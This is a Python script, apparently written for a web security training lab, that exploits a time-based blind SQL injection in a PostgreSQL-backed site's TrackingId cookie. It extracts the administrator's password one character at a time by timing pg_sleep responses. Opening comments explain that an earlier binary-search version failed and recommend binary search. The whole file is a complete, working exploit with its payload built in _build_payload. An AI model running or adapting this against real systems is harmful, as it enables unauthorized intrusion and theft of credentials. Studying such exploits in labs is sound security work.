# initial version did not work, becasue as it turns out postgres does not necessarily compare strings the way python does
# this meant i should have used ASCII function over values in postgres injected value, which i did not
# this script is therefore a brute force fallback that I came up with as a last resort, but i'd recommend using binary search instead

import string
import requests
import os
from dotenv import load_dotenv
import time

load_dotenv()

DEFAULT_URL = os.getenv('DEFAULT_URL', '')
TRACKING_ID = os.getenv('TRACKING_ID', '')
SESSION = os.getenv('SESSION', '')
REFERER = os.getenv('REFERER', '')

session = requests.Session()
session.headers.update({
    'User-Agent': 'Mozilla/5.0',
    'Referer': REFERER
})
session.cookies.set('session', SESSION)

AVAILABLE_CHARACTERS = string.ascii_letters + string.digits

DELAY_SECONDS = 3
TIME_THRESHOLD = DELAY_SECONDS * 0.4
PAGE_LOADED_MARKER = 'Giant Pillow Thing'
DEBUG = True

def _build_payload(password_index, checked_character):
    return f"{TRACKING_ID}' OR (SELECT CASE WHEN (SUBSTRING((SELECT password from users where username='administrator'), {password_index}, 1))='{checked_character}' THEN pg_sleep({DELAY_SECONDS}) ELSE pg_sleep(0) END) IS NOT NULL--"

def _timed_request(payload):
    start = time.time()
    response = session.get(DEFAULT_URL, cookies={"TrackingId": payload})
    elapsed = time.time() - start

    page_loaded = PAGE_LOADED_MARKER in response.text
    if DEBUG:
        print(f"      status={response.status_code} len={len(response.content)} page_loaded={page_loaded} elapsed={elapsed:.2f}s")
    if not page_loaded:
        print(f"      !! marker not found, response body starts with: {response.text[:300]!r}")
        raise(Exception("Page loaded marker not found in response."))

    return elapsed

def _is_hit(password_index, checked_character):
    payload = _build_payload(password_index, checked_character)
    elapsed = _timed_request(payload)
    result = elapsed >= TIME_THRESHOLD
    if DEBUG:
        print(f"    _is_hit   idx={password_index} char={checked_character!r:>5} elapsed={elapsed:.2f}s -> {result}")
    return result

def _find_char_for_index(password_index):
    # Brute force each character in the set
    for char in AVAILABLE_CHARACTERS:
        if _is_hit(password_index, char):
            return char
    return None

def detect_password():
    password = ''
    char_index = 1

    while True:
        print(f"\n--- Finding character at index {char_index} (password so far: {password!r}) ---")
        char = _find_char_for_index(char_index)
        if not char:
            print(f"⚠️  No character found at index {char_index}. Stopping.")
            break
        else:
            password += char
            print(f"✅ Found character at index {char_index}: {char!r} -> password so far: {password!r}")
            char_index += 1
            time.sleep(0.1)

    if password:
        print(f"\n🔓 Extracted password: {password!r}")
    else:
        print("\n❌ No password extracted.")

    return password

password = detect_password()
